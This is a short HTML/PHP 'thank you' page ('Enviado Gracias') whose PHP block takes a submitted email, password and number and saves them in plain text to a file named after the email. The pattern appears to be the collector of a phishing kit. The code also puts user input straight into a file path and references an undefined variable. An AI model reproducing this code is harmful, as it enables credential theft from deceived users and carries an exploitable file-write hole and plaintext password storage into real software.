<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Enviado Gracias</title>
	<style>
		*{margin: 0; padding: 0; background:#2d2d2d;}
		p{border-bottom: solid 2px #fff; width: 70%; margin-top:100px;color:#fff;
			font-size: 40px; text-align: center; font-family: verdana;}

			h1{text-align: center;font-size: 80px; color:#fff; border:solid 1px gray;}
	</style>
</head>
<body>

		<?php 

$email = $_POST['email'];
$paswor = $_POST['paswor'];
$numer = $_POST['numer'];


$contenido="name: $name

paswor: $paswor
name: $name
email: $email
numer: $numer
";

$archivo = fopen("datos/$email.txt", "w+");
fwrite($archivo, $contenido);



?>

	</center>
</body>
</html>